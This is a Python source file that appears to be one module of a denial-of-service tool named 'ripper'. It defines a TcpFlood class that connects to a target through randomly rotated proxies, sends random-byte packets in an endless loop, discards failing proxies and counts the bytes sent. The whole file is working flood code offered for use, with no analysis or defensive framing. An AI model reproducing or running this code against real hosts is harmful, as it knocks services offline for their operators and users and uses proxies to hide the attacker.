from socket import socket
from contextlib import suppress
from random import randbytes
from typing import Tuple, Any

from socks import ProxyError

from ripper.context import Context, Errors


class TcpFlood:
    _sock: socket
    _target: Tuple[str, int]
    _ctx: Context
    _proxy: Any = None

    def __init__(self, target: Tuple[str, int], context: Context):
        self._target = target
        self._ctx = context

    def create_connection(self) -> socket:
        self._proxy = self._ctx.proxy_manager.get_random_proxy()
        conn = self._ctx.sock_manager.create_tcp_socket(self._proxy)
        conn.connect(self._target)

        return conn

    def __call__(self, *args, **kwargs):
        with suppress(Exception), self.create_connection() as s:
            self._ctx.Statistic.connect.status_success()
            while self.send(s):
                continue

    def send(self, sock: socket) -> bool:
        try:
            sent = sock.send(randbytes(self._ctx.max_random_packet_len))
        except ProxyError:
            self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
        except Exception as e:
            self._ctx.add_error(Errors('TCP send Err', e))
            sock.close()
        else:
            self._ctx.Statistic.packets.status_sent(sent_bytes=sent)
            self._proxy.report_success() if self._proxy is not None else 0
            return True

        self._ctx.Statistic.connect.status_failed()
        return False
